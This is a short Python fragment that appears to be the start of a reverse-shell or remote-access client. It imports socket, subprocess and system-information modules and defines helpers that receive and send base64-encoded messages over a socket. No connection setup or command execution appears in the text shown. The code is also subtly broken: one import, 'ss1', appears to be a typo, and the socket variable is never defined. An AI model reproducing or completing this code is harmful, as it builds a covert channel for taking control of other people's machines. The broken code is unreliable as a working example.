import socket
import subprocess
import os
import base64
import pwd
import platform
import time
import ss1

def inbound():
    message = ''
    while True:
        try:
            message = sock.recv(1024).decode()
            message = base64.b64decode(message)
            message = message.decode().strip()
            return message
        except Exception:
            sock.close()

def outbound(message):
    response = str(message)
    response = base64.b64encode(bytes(response, encoding='utf8'))
    sock.send(response)
